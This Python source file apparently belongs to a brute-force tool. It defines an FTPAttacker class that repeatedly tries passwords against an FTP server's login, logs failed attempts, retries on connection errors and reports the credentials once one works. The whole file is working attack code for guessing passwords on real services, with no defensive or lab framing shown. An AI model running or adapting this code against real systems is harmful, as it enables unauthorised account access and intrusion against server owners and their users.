import ftplib
from target import Target, Attacker


class FTPAttacker(Attacker):
    def __init__(self, target: Target):
        super().__init__(target)

    def try_connect(self, password):
        try:
            ftpclient = ftplib.FTP()
            ftpclient.connect(self.target.host, self.target.port)
            ftpclient.login(self.target.login, password)
            ftpclient.quit()
        except ftplib.error_perm:
            self.tries += 1
            print("[%s] Failed attempt against %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, password))
            return True
        except OSError:
            print("[%s] Connection error - %s" % (self.name, self.target.host))
            return False
        except Exception:
            print("[%s] Unknown exception while connecting to %s" %
                  (self.name, self.target.host))
            return False
        else:
            self.tries += 1
            FTPAttacker.finish = True
            FTPAttacker.password = password
            FTPAttacker.success = True
            print("[%s] Found credentials for %s - user: %s, password: %s" %
                  (self.name, self.target.host, self.target.login, password))
            return True
        finally:
            ftpclient.close()

    def run(self):
        while FTPAttacker.finish is False:
            password = self.get_password()
            if password is None:
                continue

            while self.try_connect(password) is False and FTPAttacker.finish is False:
                pass
